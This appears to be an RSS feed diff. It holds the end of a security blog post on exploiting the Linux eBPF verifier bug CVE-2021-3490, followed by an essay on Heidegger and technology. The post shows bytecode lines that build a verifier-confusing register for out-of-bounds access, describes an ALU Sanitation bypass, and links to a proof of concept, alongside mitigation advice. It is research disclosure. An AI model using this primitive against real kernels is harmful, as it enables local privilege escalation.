+<span><span> UNKOWN_REG </span></span>: <span><span> var_off = {mask = 0xFFFFFFFF00000001; value = 0x0} </span></span>. Because the upper 32 bits of <span><span> UNKNOWN_REG  </span></span>are unknown, the upper 32 bits of the result will also be unknown. The same goes for the lowest bit - it could be either 0 or 1. Since the lowest bit of 
+<span><span> EXPLOIT_REG </span></span> is known to be 1, the result of adding the two bits could be either 1 or 2. This means that the second lowest bit is also unknown. The rest of the bits are known to be 0 in both the destination and source. This leaves <span><span> EXPLOIT_REG </span></span> with <span><span> var_off = {mask = 0xFFFFFFFF00000003; value = 0x0} </span></span>.</span></p><p id="viewer-bakc1"><span>Recall that we know that the verifier will now call three more functions that will affect the bounds of the destination register:  <span><span> __update_reg_bounds </span></span>,  <span><span> __reg_deduce_bounds </span></span>, and 
+<span><span> __reg_bound_offset </span></span>.  
+
+</span></p><p id="viewer-9d28o"><span>In <span><span> __update_reg32_bounds </span></span>, where <span><span> var32_off.value </span></span> is <span><span> var_off </span></span> for the lower 32 bits of destination register <span><span> EXPLOIT_REG </span></span>:</span></p><pre id="viewer-53vhf"><span>reg<span>-</span><span>&gt;</span>u32_min_value <span>=</span> <span>max_t</span><span>(</span>u32<span>,</span> reg<span>-</span><span>&gt;</span>u32_min_value<span>,</span>
+                          <span>(</span>u32<span>)</span>var32_off<span>.</span>value<span>)</span><span>;</span>
+reg<span>-</span><span>&gt;</span>u32_max_value <span>=</span> <span>min</span><span>(</span>reg<span>-</span><span>&gt;</span>u32_max_value<span>,</span>
+                         <span>(</span>u32<span>)</span><span>(</span>var32_off<span>.</span>value <span>|</span> var32_off<span>.</span>mask<span>)</span><span>)</span><span>;</span></span></pre><p id="viewer-26b7h"><span>Luckily, the bounds remain unchanged. Since <span><span> 2 &gt; 0 </span></span>, the min bound remains the same. For the max bound, we are not comparing against <span><span> var32_off.value  = 0 </span></span>, but <span><span> var_off.value | var32_off.mask = 3 </span></span>. So, since <span><span> 2 &lt; 3 </span></span>, the max bound also remains the same.  Similar logic applies to the signed bounds.
+
+</span></p><p id="viewer-99mv"><span>Since the signed and the unsigned 32 bit bounds are all equal, they are not modified by 
+<span><span> __reg32_deduce_bounds </span></span>. </span></p><p id="viewer-9953h"><span>Last, in <span><span> __reg_bound_offset </span></span>, we have:</span></p><pre id="viewer-epist"><span>struct tnum var32_off <span>=</span> <span>tnum_intersect</span><span>(</span><span>tnum_subreg</span><span>(</span>reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>,</span>
+                                     <span>tnum_range</span><span>(</span>reg<span>-</span><span>&gt;</span>u32_min_value<span>,</span>
+                                     reg<span>-</span><span>&gt;</span>u32_max_value<span>)</span><span>)</span><span>;</span></span></pre><p id="viewer-7vf6d"><span>Where <span><span> var32_off </span></span> will be set equal to the lower 32 bit component of <span><span> var_off </span></span> for our destination register, <span><span> EXPLOIT_REG </span></span>. Recall that since <span><span>u32_min_value = u32_max_value</span></span>, <span><span>tnum_range</span></span> will return a <span><span> tnum </span></span> that has a known constant value of 2, since the range only includes one integer value. Since the current <span><span> var_off </span></span> has a lower 32 bit <span><span> mask = 0x3 </span></span>, <span><span>tnum_intersect</span></span> returns in the lowest three bits as known and equal to 2! 
+
+</span></p><p id="viewer-79ivo"><span>After all that, we have <span><span> EXPLOIT_REG </span></span> with bounds: <span><span> {u,s}32_min_value = {u,s}32_max_value = 2, var_off = {mask = 0xFFFFFFFF00000000; value = 0x2} </span></span>.  That is to say, a register with the lowest 32 bits are known and equal to 2. During runtime though, the register is equal to 1!</span></p><p id="viewer-3guid"><span>All that’s left to do is zero extend the lower 32 bits of the register and do a simple <span><span> AND </span></span> operation:</span></p><pre id="viewer-a3oja"><span><span>BPF_MOV32_REG</span><span>(</span><span>EXPLOIT_REG</span><span>,</span> <span>EXPLOIT_REG</span><span>)</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_AND</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>1</span><span>)</span></span></pre><p id="viewer-8na0h"><span>The verifier will now believe <span><span> EXPLOIT_REG = 0 </span></span> because <span><span> 2 &amp; 1 = 0 </span></span>, but it will be equal to 1. We can now use this register to do OOB read/writes on eBPF map pointers.</span></p><h3 id="viewer-59hp6"><span>ALU Sanitation</span></h3><p id="viewer-8id1c"><span>The strategy to bypass ALU Sanitation is excellently described in <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer">this blog</a> by <a href="https://twitter.com/_manfp" target="_blank" rel="noopener noreferrer">Manfred Paul</a>. Here he details the LPE exploitation strategy he used in Pwn2Own 2020. 
+
+</span></p><p id="viewer-2bb5q"><span>Interestingly, this bypass was not needed at the time of the 2020 competition. When testing my exploit, I found that it was failing on some newer (but still vulnerable) Ubuntu kernels. The reason was because I was not  bypassing ALU Sanitation. During my initial research period I looked at many different public eBPF verifier exploits. Strangely, I didn’t see an ALU Sanitation bypass in any of them!
+
+</span></p><p id="viewer-8ig1g"><span>After some investigation I discovered the reason. There was an integer underflow bug was when calculating the <span><span> alu_limit </span></span> in the verifier.  It was present until March 2021, and fixed in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899" target="_blank" rel="noopener noreferrer">this commit</a> <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899" target="_blank" rel="noopener noreferrer">[17]</a>.
+
+</span></p><p id="viewer-1degh"><span>The bug is triggered when <span><span> alu_limit = 0 </span></span>. An example case is doing a subtraction operation with a pointer at the start of a map.</span></p><p id="viewer-bmkp8"><span>The sanitation instruction that was patched in:</span></p><pre id="viewer-soiq"><span><span>*</span>patch<span>++</span> <span>=</span> <span>BPF_MOV32_IMM</span><span>(</span><span>BPF_REG_AX</span><span>,</span> aux<span>-</span><span>&gt;</span>alu_limit <span>-</span> <span>1</span><span>)</span><span>;</span></span></pre><p id="viewer-2mkka"><span>Subtracting 1 from 0 results in <span><span> aux→alu_limit = 0xFFFFFFFF </span></span>. </span></p><p id="viewer-b72lu"><span>The strategy for eBPF exploits depends on modifying the <span><span> bpf_map </span></span> structure found in the memory chunk before the map’s memory. This is done by subtracting from a map pointer. </span></p><p id="viewer-9hn60"><span>ALU Sanitation was rendered completely useless by this bug against exploits of this type, and it went unnoticed even though many PoCs were publicly available. Of course, ALU Sanitation can be easily bypassed regardless.  The new implementation of ALU Sanitation is much more effective against these attacks, which I will go over in the Mitigations section. 
+
+</span></p><h3 id="viewer-e6t4f"><span>Finishing Up the LPE
+
+</span></h3><p id="viewer-dp0cs"><span>We have established the primitive, a register <span><span> EXPLOIT_REG </span></span> which the verifier believes to be 0 but is actually equal to 1 at runtime. The next steps are beautifully outlined in Manfred Paul’s <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer">blog post</a>. You can check out the <a href="https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490" target="_blank" rel="noopener noreferrer">released PoC</a> to see the implementation. </span></p><p id="viewer-68bdk"><span><a href="https://youtu.be/EtQieYKtTY8" target="_blank" rel="noopener noreferrer"><em>https://youtu.be/EtQieYKtTY8</em></a></span></p><h2 id="viewer-b66k6"><span>Mitigations</span></h2><h3 id="viewer-bg2nv"><span>Unprivileged eBPF
+
+</span></h3><p id="viewer-7d1em"><span>As mentioned in the introduction, running eBPF programs can be disallowed for unprivileged users by setting the <span><span> sysctl </span></span> knob  <span><span>	kernel.unprivileged_bpf_disabled </span></span>. In May 2021, a new <span><span> kconfig </span></span> knob, <span><span> BPF_UNPRIV_DEFAULT_OFF </span></span>,  was introduced that sets the 
+ <span><span> sysctl </span></span> knob  by default <a href="https://www.spinics.net/lists/netdev/msg740795.html" target="_blank" rel="noopener noreferrer">[7]</a>. </span></p><p id="viewer-fm4eh"><span>Enabling these configurations will protect against attacks by disallowing unprivileged users from [ab]using eBPF.  However, this doesn’t mitigate the problem completely. A privileged user can still use the arbitrary kernel write in this exploit to bypass or disable kernel security modules like SELinux. </span></p><h3 id="viewer-eit7c"><span>ALU Sanitation</span></h3><p id="viewer-93mq3"><span>As of April 2021, the implementation of ALU Sanitation has changed <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0" target="_blank" rel="noopener noreferrer">[15]</a>. The new implementation helps mitigate attacks like the one demonstrated in this blog. 
+
+</span></p><p id="viewer-39o1"><span>First, the way <span><span>alu_limit</span></span>  is calculated has changed. Now, instead of using the position of the pointer register to compute it, the offset register is used instead. For example, suppose we have some register with unsigned bounds <span><span>umax_value = 1, umin_value = 0</span></span>.  Then, the computed <span><span>alu_limit = 1</span></span>. This means that if the register is outside of those bounds during runtime, pointer arithmetic does not occur using that register.</span></p><p id="viewer-40gge"><span>Additionally, ALU sanitation now patches pointer operation instructions if the scalar register is <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L12376" target="_blank" rel="noopener noreferrer">known to be constant</a>.  </span></p><pre id="viewer-2qh7c"><span>bool off_is_imm <span>=</span> <span>tnum_is_const</span><span>(</span>off_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+alu_state <span>|=</span> off_is_imm <span>?</span> <span>BPF_ALU_IMMEDIATE</span> <span>:</span> <span>0</span><span>;</span>
+isimm <span>=</span> aux<span>-</span><span>&gt;</span>alu_state <span>&amp;</span> <span>BPF_ALU_IMMEDIATE</span><span>;</span>
+<span>...</span>
+<span>if</span> <span>(</span>isimm<span>)</span> <span>{</span>
+        <span>*</span>patch<span>++</span> <span>=</span> <span>BPF_MOV32_IMM</span><span>(</span><span>BPF_REG_AX</span><span>,</span> aux<span>-</span><span>&gt;</span>alu_limit<span>)</span><span>;</span>
+    <span>}</span> <span>else</span> <span>{</span>
+         <span>// Patch alu_limit check instructions</span>
+         <span>...</span><span>.</span>
+     <span>}</span></span></pre><p id="viewer-fjgeo"><span>The above patch shows that the offset register is only checked against its alu_limit if is not known to be constant. If it is constant, the operation is patched with an immediate instruction using its <em>constant value.</em> </span></p><p id="viewer-baqrm"><span>Here’s an example. Suppose we have the following instruction:</span></p><pre id="viewer-aqgvc"><span><span>BPF_ALU64_REG</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>EXPLOIT_REG</span><span>)</span></span></pre><p id="viewer-dmit5"><span>Here, <span><span> BPF_REG_2 </span></span> contains a pointer to a map, and <span><span> EXPLOIT_REG </span></span> contains a register the verifier believes has a value of 0, but the runtime value is 1. The ALU Sanitation will apply a patch such that the effective instruction is:</span></p><pre id="viewer-63a4u"><span><span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>0</span><span>)</span></span></pre><p id="viewer-2tfk1"><span>The intention is to mitigate against <a href="https://meltdownattack.com/" target="_blank" rel="noopener noreferrer">speculative execution side-channel vulnerabilities</a><a href="https://spectreattack.com/spectre.pdf" target="_blank" rel="noopener noreferrer"> </a><a href="https://spectreattack.com/spectre.pdf" target="_blank" rel="noopener noreferrer">[16]</a>, but it also serves to thwart attack methods such as the one presented in this blog. </span></p><p id="viewer-tqt0"><span>Sadly, this marks the end of an era for this elegant exploit primitive against the eBPF verifier. While this will make exploiting vulnerabilities like <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">CVE-2021-3490</a> harder,  I do not think this will be the end of exploitation with eBPF. I’ll discuss this further in the next section. </span></p><h2 id="viewer-bhgnb"><span>Future Considerations</span></h2><p id="viewer-dptd0"><span>Since the introduction of eBPF, there have been a number of privilege escalation attacks that leverage the technology. In addition to exploiting vulnerabilities in eBPF itself, it also represents a powerful primitive for exploiting other kernel vulnerabilities. While eBPF can be a great tool for developers, there’s still more work to be done to harden it further.</span></p><p id="viewer-1nl1o"><span>Despite the new mitigations discussed in the ALU Sanitation section, exploits like the one demonstrated in the DoS exploitation section will still work. Patching dead code branches with exit instructions instead of jump backwards would prevent these type of attacks. 
+
+</span></p><p id="viewer-35l9k"><span>An LPE exploit writeup by Qualys published in July 2021 uses a memory corruption vulnerability to overwrite an eBPF program buffer, which contains the eBPF bytecode for a loaded program. Instead of fooling the verifier, the program is valid and passes verification. The buffer is overwritten after verification but before JIT compilation to achieve OOB read/write capabilities <a href="https://www.qualys.com/2021/07/20/cve-2021-33909/sequoia-local-privilege-escalation-linux.txt" target="_blank" rel="noopener noreferrer">[8]</a>. As this exploit demonstrates, the window after validation and before JIT compilation is not small, and a race can be won to target a write. The eBPF program buffer memory should be marked read-only before verification, so that it can&#39;t be modified during verification, and stay read-only until JIT compilation.  This would prevent eBPF from being used as a powerful primitive when exploiting kernel memory corruption vulnerabilities. This was first suggested by<a href="https://twitter.com/spendergrsec" target="_blank" rel="noopener noreferrer"> </a><a href="https://twitter.com/spendergrsec" target="_blank" rel="noopener noreferrer">Brad Spengler</a> in 2016 <a href="https://twitter.com/spendergrsec/status/1417487276075012109" target="_blank" rel="noopener noreferrer">[9]</a>.</span></p><p id="viewer-bbs9r"><span><strong>References</strong></span></p><ol><li id="viewer-2i0n6"><p><a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/" target="_blank" rel="noopener noreferrer">https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/</a></p></li><li id="viewer-2iomo"><p><a href="https://www.collabora.com/news-and-blog/blog/2019/04/15/an-ebpf-overview-part-2-machine-and-bytecode/" target="_blank" rel="noopener noreferrer">https://www.collabora.com/news-and-blog/blog/2019/04/15/an-ebpf-overview-part-2-machine-and-bytecode/</a></p></li><li id="viewer-dgqe7"><p><a href="https://www.spinics.net/lists/xdp-newbies/msg00185.html" target="_blank" rel="noopener noreferrer">https://www.spinics.net/lists/xdp-newbies/msg00185.html</a></p></li><li id="viewer-bjl00"><p><a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer">https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a></p></li><li id="viewer-ftm0t"><p><a href="https://blog.stackpath.com/bpf-hook-points-part-1/" target="_blank" rel="noopener noreferrer">https://blog.stackpath.com/bpf-hook-points-part-1/</a></p></li><li id="viewer-bfs7l"><p><a href="https://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html" target="_blank" rel="noopener noreferrer">https://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html</a></p></li><li id="viewer-7q31a"><p><a href="https://www.spinics.net/lists/netdev/msg740795.html" target="_blank" rel="noopener noreferrer">https://www.spinics.net/lists/netdev/msg740795.html</a></p></li><li id="viewer-f22d8"><p><a href="https://www.qualys.com/2021/07/20/cve-2021-33909/sequoia-local-privilege-escalation-linux.txt" target="_blank" rel="noopener noreferrer">https://www.qualys.com/2021/07/20/cve-2021-33909/sequoia-local-privilege-escalation-linux.txt</a></p></li><li id="viewer-76mgd"><p><a href="https://twitter.com/spendergrsec/status/1417487276075012109" target="_blank" rel="noopener noreferrer">https://twitter.com/spendergrsec/status/1417487276075012109</a></p></li><li id="viewer-2rkeh"><p><a href="https://github.com/qmonnet/rbpf" target="_blank" rel="noopener noreferrer">https://github.com/qmonnet/rbpf</a></p></li><li id="viewer-48iqe"><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener noreferrer">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p></li><li id="viewer-9a0d7"><p><a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/bpf.h#L65" target="_blank" rel="noopener noreferrer">https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/bpf.h#L65</a></p></li><li id="viewer-59lgn"><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490</a></p></li><li id="viewer-2ipkb"><p><a href="https://man7.org/linux/man-pages/man2/bpf.2.html" target="_blank" rel="noopener noreferrer">https://man7.org/linux/man-pages/man2/bpf.2.html</a></p></li><li id="viewer-7tvs"><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0" target="_blank" rel="noopener noreferrer">https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0</a></p></li><li id="viewer-fe9u1"><p><a href="https://meltdownattack.com/" target="_blank" rel="noopener noreferrer">https://meltdownattack.com/</a></p></li><li id="viewer-b4mg6"><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899" target="_blank" rel="noopener noreferrer">https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899</a></p></li><li id="viewer-5pu7e"><p><a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener noreferrer">https://github.com/iovisor/bcc</a></p></li></ol><p id="viewer-ds6mp"><span><strong>Acknowledgements</strong></span></p><p id="viewer-81jav"><span><a href="https://twitter.com/_manfp" target="_blank" rel="noopener noreferrer">Manfred Paul</a>, for the original vulnerability discovery, and the <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer">excellent writeup</a> on exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8835" target="_blank" rel="noopener noreferrer">CVE-2020-8835</a>, an eBPF verifier vulnerability. </span></p><p id="viewer-7us1o"><span><a href="https://twitter.com/scannell_simon" target="_blank" rel="noopener noreferrer">Simon Scannell,</a> for a great <a href="https://scannell.io/posts/ebpf-fuzzing/" target="_blank" rel="noopener noreferrer">eBPF fuzzing and exploitation writeup</a>. As well as an excellent <a href="https://github.com/scannells/exploits/tree/master/CVE-2020-27194" target="_blank" rel="noopener noreferrer">PoC</a> exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-27194" target="_blank" rel="noopener noreferrer">CVE-2020-27194</a>, another eBPF verifier vulnerability. I used this PoC to learn about eBPF bytecode and exploitation.</span></p><p id="viewer-dj9ou"><span><a href="https://twitter.com/and_zza" target="_blank" rel="noopener noreferrer">Andréa</a>, for her excellent work helping with graphics and the publishing of this blog post. </span></p><p id="viewer-af9lc"><span><a href="https://twitter.com/InsanityBit" target="_blank" rel="noopener noreferrer">InsanityBit</a> and <a href="https://www.graplsecurity.com/" target="_blank" rel="noopener noreferrer">Grapl</a>, for supporting this research. </span></p></div></div></div></div></div></div></article></div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 14:21:20 +0000</pubDate>
+      <source>https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story</source>
+    </item>
+    <item>
+      <title>Understanding Heidegger on Technology (2014)</title>
+      <link>https://www.thenewatlantis.com/publications/understanding-heidegger-on-technology</link>
+      <description></description>
+      <content:encoded><![CDATA[<img src="https://rss.markdessain.com/feeds/hackernews/https___www_thenewatlantis_com_publications_understanding-heidegger-on-technology/image.jpg" /> 
+<div id="readability-page-1" class="page"><div>
+          
+          
+<p>Martin Heidegger (1889–1976) was perhaps the most divisive philosopher of the twentieth century. Many hold him to be the most original and important thinker of his era. Others spurn him as an obscurantist and a charlatan, while still others see his reprehensible affiliation with the Nazis as a reason to ignore or reject his thinking altogether. But Heidegger’s undoubted influence on contemporary philosophy and his unique insight into the place of technology in modern life make him a thinker worthy of careful study.</p>
+
+
+
+<p>In his landmark book <a href="http://www.amazon.com/Being-Time-Martin-Heidegger/dp/0061575593/ref=as_sl_pc_ss_til?tag=thenewatl-20"><i>Being and Time</i></a> (1927), Heidegger made the bold claim that Western thought from Plato onward had forgotten or ignored the fundamental question of what it means for something <i>to b</i><i>e</i> — to be present for us prior to any philosophical or scientific analysis. He sought to clarify throughout his work how, since the rise of Greek philosophy, Western civilization had been on a trajectory toward nihilism, and he believed that the contemporary cultural and intellectual crisis — our decline toward nihilism — was intimately linked to this forgetting of being. Only a rediscovery of being and the realm in which it is revealed might save modern man.</p>
+
+
+
+<p>In his later writings on technology, which mainly concern us in this essay, Heidegger draws attention to technology’s place in bringing about our decline by constricting our experience of things as they are. He argues that we now view nature, and increasingly human beings too, only technologically — that is, we see nature and people only as raw material for technical operations. Heidegger seeks to illuminate this phenomenon and to find a way of thinking by which we might be saved from its controlling power, to which, he believes, modern civilization both in the communist East and the democratic West has been shackled. We might escape this bondage, Heidegger argues, not by rejecting technology, but by perceiving its danger.</p>
+
+
+<div><div>
+  
+	<h5>
+		Heidegger’s Life and Influence	</h5>
+</div></div>
+
+
+<p><span>T</span>he son of a sexton, Martin Heidegger was born in southern Germany in 1889 and was schooled for the priesthood from an early age. He began his training as a seminary student, but then concentrated increasingly on philosophy, natural science, and mathematics, receiving a doctorate in philosophy from the University of Freiburg. Shortly after the end of the Great War (in which he served briefly near its conclusion), he started his teaching career at Freiburg in 1919 as the assistant to Edmund Husserl, the founder of phenomenology. Heidegger’s courses soon became popular among Germany’s students. In 1923 he began to teach at the University of Marburg, and then took Husserl’s post at Freiburg after Husserl retired from active teaching in 1928. The publication of <i>Being and Time</i> in 1927 had sealed his reputation in Europe as a significant thinker.</p>
+
+
+
+<p>Heidegger’s influence is indicated in part by the reputation of those who studied under him and who respected his intellectual force. Hannah Arendt, Hans-Georg Gadamer, Hans Jonas, Jacob Klein, Karl Löwith, and Leo Strauss all took classes with Heidegger. Among these students, even those who broke from Heidegger’s teachings understood him to be the deepest thinker of his time. Although he became recognized as the leading figure of existentialism, he distanced himself from the existentialism of philosophers such as Jean-Paul Sartre. In Heidegger’s view, they turned his unique thought about man’s being in the world into yet another nihilistic assertion of the dominance of human beings over all things. He insisted that terms such as anxiety, care, resoluteness, and authenticity, which had become famous through <i>Being and Time</i>, were for him elements of the “<a href="http://www.amazon.com/dp/0060637633?tag=the-new-atlantis-20">openness of being</a>” in which we find ourselves, not psychological characteristics or descriptions of human willfulness, as some existentialists understood them.</p>
+
+
+
+<p>Heidegger’s intellectual reputation in the United States preceded much direct acquaintance with his work because of the prominence of existentialism and the influence of his students, several of whom had fled Germany for the United States long before translators began producing English editions of his important works. (<i>Being and Time</i> was first translated in 1962.) Arendt in particular, who had immigrated to America in the early 1940s, encouraged the introduction of her teacher’s work into the United States. Heidegger’s most popular if indirect significance was during existentialism’s heyday from the end of the Second World War until its nearly simultaneous apotheosis and collapse on the hazy streets of San Francisco. Late Sixties Be-Ins — mass gatherings in celebration of American counterculture — appropriated existentialist themes; Heidegger’s intellectual rigor had been turned into mush, but it was still more or less recognizably Heideggerian mush. Herbert Marcuse, a hero to the more intellectual among the Sixties gaggle, was an early student of Heidegger’s, and his books such as <a href="http://www.amazon.com/dp/0807015555?tag=thenewatl-20"><i>Eros and Civilization</i></a> and <a href="http://www.amazon.com/dp/0807014176?tag=thenewatl-20"><i>One-Dimensional Man</i></a> owe something to him, if more to Freud and, especially, Marx.</p>
+
+
+
+<p>After the 1960s, Heidegger’s intellectual radicalism became increasingly domesticated by the American academy, where wild spirits so often go to die a lingering bourgeois death. His works were translated, taught, and transformed into theses fit for tenure-committee review. Still, Heidegger’s influence among American philosophy professors has remained limited (although not entirely negligible), since most of them are, as Nietzsche might say, essentially gastroenterologists with a theoretical bent. Heidegger became more influential, though usually indirectly, for the ways artists and architects talk about their work — no one can conjure a “built space” quite as well as Heidegger does, for instance in his essay “<a href="http://www.amazon.com/dp/0060937289?tag=thenewatl-20">Building Dwelling Thinking</a>.” And much of Heidegger can also be heard in the deconstructionist lingo of literary “theory” that over the past forty years has nearly killed literature. The result is that “Heidegger” is now a minor academic industry in many American humanities departments, even as he remains relatively unappreciated by most professional philosophers.</p>
+
+
+
+<p>But Heidegger’s influence is not only limited by the lack of respect most of our philosophy professors have toward his work. More troubling for many both within and outside the academy is Heidegger’s affiliation with the Nazis before and during the Second World War. His mentor Edmund Husserl was dismissed from the University of Freiburg in 1933 because of his Jewish background. Heidegger became rector of the university in that same year, and joined the Nazi party, of which he remained a member until the end of the war. Even though he resigned the rectorship after less than a year and distanced himself from the party not long after joining, he never publicly denounced the party nor publicly regretted his membership. (<a href="http://www.amazon.com/gp/product/0226664414/ref=as_li_tf_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0226664414&amp;linkCode=as2&amp;tag=thenewatl-20">He is said to have once remarked</a> privately to a student that his political involvement with the Nazis was “the greatest stupidity of his life.”) After the war, on the recommendation of erstwhile friends such as Karl Jaspers, he was banned by the Allied forces from teaching until 1951.</p>
+
+
+
+<p>For obvious reasons, some of Heidegger’s friends and followers have, from the end of the war to the present day, obfuscated the relationship between Heidegger’s thought and his politics. They are surely aided in this by Heidegger’s masterful ambiguity — for him it really does depend on what the meaning of the word “is” is. His admirers do not want his work to be ignored preemptively because of his affiliation with the Nazis. Heidegger, after all, was not Hitler’s confidant, or an architect of the war and the extermination camps, but a thinker who engaged in several shameful actions toward Jews, and for a time supported the Nazis publicly, and thought he could lead the regime intellectually.</p>
+
+
+
+<p>This matter has come under renewed attention with the <a href="http://chronicle.com/article/Release-of-Heidegger-s/144897/forceGen=1">recent release of Heidegger’s “Black Notebooks,”</a> which are a kind of philosophical diary he kept in the 1930s and 1940s and whose contents fill a six-hundred-page volume. In his will, Heidegger had requested that these notebooks not be published until after the rest of his extensive work was released. The notebooks’ editor, Peter Trawny, reports that they contain hostile references to “world Jewry” that indicate “that anti-Semitism tied in to his philosophy.” Careful study of these notebooks will be required to determine whether they in fact provide new evidence of Heidegger’s anti-Semitism and affiliation with the Nazis that is even more damning than what is already widely known. No one who has examined Heidegger is surprised by what has been reported. But the question still remains whether Heidegger’s thought and politics are intrinsically linked, or whether, as his apologists would have it, his thought is no more (and in fact, less) related to his politics than it is to his interest in soccer and skiing. In truth, it would be surprising if the connection between the philosophy and the political beliefs and actions of a thinker of Heidegger’s rank were simply random.</p>
+
+
+
+<p>In fact, Heidegger’s association with the Nazis was far from accidental. One of his infamous remarks on politics was a statement about the “inner truth and greatness” of National Socialism that he made in a 1935 lecture course. In a 1953 republication of that speech as <a href="http://www.amazon.com/Introduction-Metaphysics-Edition-Martin-Heidegger/dp/0300186126/ref=as_sl_pc_ss_til?tag=thenewatl-20"><i>Introduction to Metaphysics</i></a>, Heidegger appended a parenthetical clarification, which he claimed was written but not delivered in 1935, of what he believed that “inner truth and greatness” to be: “the encounter between global technology and modern humanity.” Some scholars, taking the added comment as a criticism of the Nazis, point to Heidegger’s explanation, following the speech’s publication, that the meaning of the original comment would have been clear to anyone who understood the speech correctly. But perhaps we should not be surprised to find a thinker so worried about “global technology” affiliating with the Nazi Party in the first place. The Nazis were opposed to the two dominant forms of government of the day that Heidegger associated with “global technology,” communism and democracy. In another of Heidegger’s infamous political remarks, made in that same 1935 lecture, he claimed that “Russia and America, seen metaphysically, are both the same: the same hopeless frenzy of enchained technology and of the rootless organization of the average man.” The Nazi’s rhetoric about “blood and soil” and the mythology of an ancient, wise, and virtuous German <i>Volk</i> might also have appealed to someone concerned with the homogenizing consequences of globalization and technology. More broadly, Heidegger’s thought always was and remained illiberal, tending to encompass all matters, philosophy and politics among them, in a single perspective, ignoring the freedom of most people to act independently. The ways in which liberal democracies promote excellence and useful competition were not among the political ideas to which Heidegger’s thought was open. His totalizing, illiberal thought made his joining the Nazis much more likely than his condemning them.</p>
+
+
+
+<p>The study of Heidegger is both dangerous and difficult — the way he is taught today threatens to obscure his thought’s connection to his politics while at the same time transforming his work into fodder for the aimless curiosity of the academic industry. Heidegger would not be surprised to discover that he is now part of the problem that he meant to address. But if, as Heidegger hoped, his works are to help us understand the challenges technology presents, we must study him both carefully and cautiously — carefully, to appreciate the depth and complexity of his thought, and cautiously, in light of his association with the Nazis.</p>
+
+
+
+
+
+<p>Heidegger’s concern with technology is not limited to his writings that are explicitly dedicated to it, and a full appreciation of his views on technology requires some understanding of how the problem of technology fits into his broader philosophical project and phenomenological approach. (Phenomenology, for Heidegger, is a method that tries to let things show themselves in their own way, and not see them in advance through a technical or theoretical lens.) The most important argument in <i>Being and Time</i> that is relevant for Heidegger’s later thinking about technology is that theoretical activities such as the natural sciences depend on views of time and space that narrow the understanding implicit in how we deal with the ordinary world of action and concern. We cannot construct meaningful distance and direction, or understand the opportunities for action, from science’s neutral, mathematical understanding of space and time. Indeed, this detached and “objective” scientific view of the world restricts our everyday understanding. Our ordinary use of things and our “concernful dealings” within the world are pathways to a more fundamental and more truthful understanding of man and being than the sciences provide; science flattens the richness of ordinary concern. By placing science back within the realm of experience from which it originates, and by examining the way our scientific understanding of time, space, and nature derives from our more fundamental experience of the world, Heidegger, together with his teacher Husserl and some of his students such as Jacob Klein and Alexandre Koyré, helped to establish new ways of thinking about the history and philosophy of science.</p>
+
+
+
